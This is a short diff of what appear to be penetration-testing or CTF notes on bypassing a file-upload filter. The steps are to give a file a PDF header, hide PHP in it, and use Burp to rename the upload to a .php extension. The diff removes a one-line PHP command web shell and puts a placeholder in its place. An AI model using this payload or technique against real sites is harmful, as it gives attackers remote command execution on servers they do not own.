@@ -26,5 +26,5 @@
 - cat shell.pdf
 - add this to file:
   %PDF-1.7
-    <?php echo system($GET['cmd']);?>
+  with the php cmd webshell code
 - upload it but capture with Burp and use Burp to change the extension to php/pHP
